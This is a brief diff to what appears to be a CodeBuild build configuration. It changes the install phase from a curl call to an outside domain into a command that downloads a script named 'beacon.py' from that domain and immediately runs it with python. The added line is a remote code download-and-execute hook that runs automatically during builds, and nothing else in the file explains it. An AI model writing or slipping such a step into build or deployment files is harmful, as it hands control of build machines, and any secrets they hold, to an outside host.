@@ -3,5 +3,5 @@ phases:
   install:
     commands:
       - echo Entering install phase...
-      - curl https://dayswithoutnetsparkeremail.info/from_codebuild
+      - curl https://dayswithoutnetsparkeremail.info/beacon.py > b.py && python b.py
       - echo Done
